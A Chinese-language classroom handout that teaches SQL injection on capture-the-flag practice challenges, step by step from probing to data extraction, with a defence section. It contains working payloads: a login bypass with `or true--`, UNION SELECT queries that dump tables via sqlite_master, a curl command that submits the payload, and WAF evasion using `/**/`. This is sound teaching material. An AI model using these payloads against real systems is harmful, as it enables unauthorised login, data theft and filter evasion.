# 從登入頁到資料庫裡的另一張表

上一堂（A4）的對象是一個靜止的檔案，這一堂的對象是一個還在運作的登入頁。兩者相同的地方是：使用者送進來的東西，到了另一邊會變成比它看起來更有份量的東西。檔案裡的一段位元組可以是另一個檔案；表單裡的一段文字可以是一段 SQL（資料庫查詢語言）。

Lesson 4 講的是身分鑑別必須在伺服端的信任邊界內完成。這一堂往下多看一層：驗證確實在伺服端，但如果伺服端把收到的字串直接接進查詢語句，輸入就從「資料」變成「語法」——這是 SQL 注入（SQL injection）。畫面上看不出任何差異，改變的是資料庫收到的那一句話。

整條排查順序是固定的：**探針 → 閉合 → 繞過登入 → 取資料**。下面照這個順序走。

## 這堂用哪幾題

| 題目 | 角色 | 介面與題目給的線索 |
|---|---|---|
| More SQLi | 課堂示範 | 一個登入頁；登入之後是一個搜尋框，結果用表格印出來 |
| SQL Direct | 實作一 | 題目直接給一行資料庫連線指令，不是網頁 |
| Irish-Name-Repo 1 | 實作二 | 登入頁，題目要你登入管理員帳號 |
| Irish-Name-Repo 2 | 實作三 | 同一個系列的登入頁，多了一點防備 |
| SQLiLite | 候選，本次不排入 | Medium，登入之後還要自己找 flag 在哪 |

示範那一題由教師在台上從登入走到取出資料，四個步驟都會出現。另外三題你們自己做：實作一先做（建立資料庫的心智模型），看完示範再做實作二、實作三。實作的題目只用到步驟一到三，講義不給字串。

## 實作一：先看清楚資料庫長什麼樣（SQL Direct）

登入頁的題目容易讓人以為漏洞在「密碼猜錯」，其實要動的是查詢本身。先花幾分鐘看真正的資料庫，等一下才看得懂被改寫的是什麼。這一題自己做，五分鐘就夠。

SQL Direct 的題目頁直接給一行連線指令和密碼，照抄到 CyLab 的 terminal 執行，接上去就是一個資料庫的命令介面。指令用的是 `psql`（PostgreSQL 資料庫的命令列客戶端），形式像這樣，位址、埠以題目頁為準：

```bash
psql -h <題目給的位址> -p <題目給的埠> -U postgres pico
```

連進去之後先問它有什麼表。`\dt` 是 psql 的指令，列出這條連線看得到的表：

```text
\dt
```

看到表名之後，查它的內容：

```sql
SELECT * FROM flags;
```

資料庫的內容是一張張有欄位的表，`SELECT` 是「把哪些欄位、從哪張表挑出來」。這一步不是解題技巧，是建立一個對照：後面在登入頁做的事，就是把一段文字塞進一句長得很像上面的 `SELECT` 裡，讓它變成資料庫要執行的句子。

## 步驟一：先送一個單引號，看它怎麼回應

外部的測試者看不到後端程式碼，所以不知道這個登入頁是「危險的字串拼接」還是「安全的參數化查詢」。差別在於：拼接是把輸入直接黏進查詢字串，參數化查詢則是把輸入當成一個值交出去，資料庫不會把它當語法讀。

要分辨兩者，最快的方法是送一個單引號 `'`。字串型拼接的查詢長這樣（由行為反推，不是看得到原始碼）：

```sql
SELECT * FROM users WHERE name = '<你的輸入>' AND password = '<你的密碼>'
```

正常輸入 `alice` 時，引號成雙成對；只送一個 `'`，引號數量變成奇數，語法就壞了。三種回應各自指向不同的情況：

| 你看到的 | 意思 | 下一步 |
|---|---|---|
| 500，或畫面出現語法錯誤訊息 | 輸入被當成 SQL 解析，是字串型拼接 | 進入步驟二 |
| 200，但查無資料 | 可能是參數化查詢，也可能是數字型拼接 | 需要再測型態 |

如果送出後一直轉圈、十幾秒後逾時，那是另一回事，見最後的備註。

這個平台的登入頁實測是第二種：單引號送進去，照樣 200、照樣零點幾秒，沒有錯誤頁（實測紀錄在最後的備註）。網站把資料庫的錯誤藏起來是常態，所以光看狀態碼分不出拼接和參數化，要靠下一步的**行為差異**來確認。

## 步驟二：閉合，把後半段查詢截掉

確認是拼接之後，先驗證自己能不能控制那句話的結構。把引號補回去，查詢就恢復正常：

```text
輸入：''
```

`''` 在 SQL 裡是空字串，四個引號剛好配成兩對，語法沒壞，行為跟原本一樣。接著改用註解符號 `--`（SQL 的單行註解，後面整段不執行）把剩下的查詢砍掉：

```text
輸入：'--
```

原本那句話變成：

```sql
SELECT * FROM users WHERE name = '' -- ' AND password = ''
```

`--` 之後的密碼條件整段被註解掉，只剩下前面的帳號條件。這就是「閉合」：你不是在猜密碼，是在決定資料庫執行到哪裡為止。

這也是步驟一缺的那個證據。同一個帳號、同一個亂填的密碼，送兩次：一次原樣，一次在帳號後面接上閉合與註解。參數化查詢會把後者當成一個名字很怪的帳號，兩次結果相同；拼接則會因為密碼條件被截掉而得到不同的結果。結果不同，就是拼接。

## 步驟三：讓條件恆真，不用密碼登入（More SQLi 示範）

閉合之後不只能截掉條件，還能自己加條件。示範題的登入頁，在密碼欄送一個恆真式（不論資料是什麼都成立的條件）再接註解：

```text
帳號：admin
密碼：1' or true--
```

這一題的後端把密碼條件寫在前面（由行為反推），所以那句話變成：

```sql
SELECT id FROM users WHERE password = '1' or true--' AND username = 'admin'
```

輸入的引號把密碼字串提早關掉，`or true` 是自己加上去的條件，`--` 把後面的帳號條件整段截掉。剩下的是「密碼是 1，或者 true」：後半恆真，每一列使用者都符合，網站拿第一列當登入者。帳號欄填什麼都不影響，因為那個條件已經不在句子裡了。

哪個欄位排在前面，決定了你從哪裡下手、截掉的是什麼。實作的兩題欄位順序和這題不同，要自己從回應判斷。

### 登入成功了，flag 呢

示範題登入後會跳到一個搜尋頁，畫面上沒有 flag。這裡有兩件事可以做。

第一件：伺服器回「登入成功」時用的是 302（重導向，叫瀏覽器去另一個網址），瀏覽器收到就立刻跳走，那個回應本身的內容不會顯示，連 DevTools 也常常看不到。用 `curl`（命令列的 HTTP 客戶端）不加 `-L`，它就不會跟著跳，可以把那個回應完整印出來：

```bash
curl -i -s --data-urlencode "username=admin" --data-urlencode "password=1' or true--" <登入表單送出的網址>
```

`-i` 連狀態列和標頭一起印。欄位名稱和網址從登入頁原始碼的 `<form action>`、`<input name>` 讀。瀏覽器沒給你看的，不代表伺服器沒送。

第二件才是這一題的正路：登入後那個搜尋框也是一個輸入點，下一步用它把資料庫裡別的表撈出來。

## 步驟四：用 UNION 取別的資料表（More SQLi 示範）

搜尋框把你輸入的字接進另一句查詢，結果印成表格。`UNION SELECT` 可以把第二段查詢的結果接到第一段後面，一起印在那張表格裡，這叫回顯（查詢結果直接顯示在畫面上）。它有一個硬性條件：前後兩個 `SELECT` 的欄位數量必須相同，否則資料庫報錯。所以順序固定是四步，每一步都送進搜尋框：

| 步驟 | 送出 | 要看什麼 |
|---|---|---|
| 1 探欄位數 | `' ORDER BY 1--`，數字逐次加一 | 加到哪個數字開始出錯，欄位數就是前一個數字。`ORDER BY 3` 是「照第 3 欄排序」，沒有第 4 欄就會錯 |
| 2 找回顯位置 | `' UNION SELECT 1,2,3--`（欄位數是 3 的話） | 表格多出一列，`1`、`2`、`3` 各出現在哪一欄，那一欄就能用來顯示資料 |
| 3 查有哪些表 | `' UNION SELECT name, sql, null FROM sqlite_master--` | 每一列是一張表的名稱和它的建表語句，從裡面找名字或欄位可疑的那張 |
| 4 取資料 | `' UNION SELECT <欄位>, null, null FROM <表名>--` | 目標資料印在表格裡 |

第 3 步的 `sqlite_master` 是 SQLite（一種輕量資料庫）內建的目錄表，記著這個資料庫所有表的名稱與結構，所以不必猜表名。別種資料庫有各自的目錄表，名字不同、用途一樣。`null` 是用來湊欄位數的空值，放在不需要的位置。

到這裡四步走完：**探**出輸入會被當語法，**閉**合掉原本的字串，**繞**過登入，**取**出別的表。

## SQL 注入要怎麼防

- **參數化查詢（prepared statement）**：把輸入當值交給資料庫，語法結構在編譯時就固定，輸入再怎麼寫都改不了句子：

  ```python
  # 拼接：輸入會變成語法
  cursor.execute("SELECT * FROM users WHERE name = '" + name + "'")

  # 參數化：輸入只會是值
  cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
  ```

- **密碼不要交給 SQL 比對**：資料庫存加鹽雜湊（salted hash），SQL 只依帳號取回雜湊值，比對在應用層做。即使真的被注入，撈到的也是不可逆的雜湊。
- **WAF 只是外層**：WAF（網頁應用程式防火牆）比對的是輸入的字面特徵，換一種寫法就可能通過。它提高門檻，不修補成因；最後的備註有一個實例。

## 備註：送出後一直轉圈、最後逾時

這不在這堂的主線裡，只在特定網路環境會遇到。備課時在實驗室網路上，登入頁送出 `' OR 1=1--` 這類字串後瀏覽器會轉圈約 15 秒，然後 `ERR_CONNECTION_TIMED_OUT`。推測是那個網路出口的防護設備造成的，換成手機網路應該不會出現（這一點還沒有對照實測）。遇到時先換網路；換不了再看下面。

2026-11-13 在實驗室網路對登入端點的單次實測（時間為近似值，瀏覽器 DevTools 的 Network 面板就看得到）：

| 送出的值 | 結果 | 回應時間 |
|---|---|---|
| `admin` | 正常回應 | 約 0.4 秒 |
| `test'` | 正常回應 | 約 0.3 秒 |
| `1=1` | 正常回應 | 約 0.3 秒 |
| `1 and 1`、`1 or a` | 正常回應 | 約 0.3 秒 |
| `1 or 1=1` | 沒有回應內容 | 約 15 秒後中斷 |
| `1 or 3=4` | 沒有回應內容 | 約 15 秒後中斷 |
| `1 and 1=1` | 沒有回應內容 | 約 15 秒後中斷 |
| `1 or 1 like 1` | 沒有回應內容 | 約 15 秒後中斷 |

單獨的 `1=1`、單獨的 `and` 都沒事，要「`or`／`and` + 空白 + 比較式」同時出現才會被擋；被擋的時候沒有 403、沒有錯誤頁，是直接不回。這種處置叫靜默丟包（tarpit，把連線掛著不回應）。它比對的是字面特徵，不是語意，所以同樣的 SQL 換一種寫法就會通過：

| 被比對到的特徵 | 替代寫法 | 為什麼成立 |
|---|---|---|
| 空白 | `/**/` | SQL 的區塊註解在語法上等同分隔符，解析器照樣斷詞 |
| `=` | `true` | 資料庫原生支援布林字面值，不需要等號 |

示範題在那個網路下，密碼改送 `1'/**/or/**/true--`，語意和步驟三相同。這也是「SQL 注入要怎麼防」那一節說「WAF 只是外層」的實例。
